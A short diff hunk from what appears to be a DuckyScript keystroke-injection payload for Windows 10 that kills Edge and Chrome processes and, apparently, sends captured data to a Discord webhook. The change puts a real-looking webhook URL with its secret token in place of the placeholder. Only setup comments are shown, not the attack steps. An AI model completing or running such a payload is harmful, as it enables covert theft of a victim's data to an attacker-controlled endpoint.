@@ -4,7 +4,7 @@ REM Description: This script kills all egde and chrome processes, starts screens
 REM Target: Windows 10
 
 REM *SETUP*
-REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+REM replace DISCORD_https://discord.com/api/webhooks/1373060974566834226/OWW96TI3xcOgurqLW41q-Vs3iVDWbqohfvmu8mn8A8qAkDJhXPDD8pOclzKGyFX2vhvr with your Discord Webhook.
 
 REM some setup for dukie script
 DEFAULT_DELAY 100
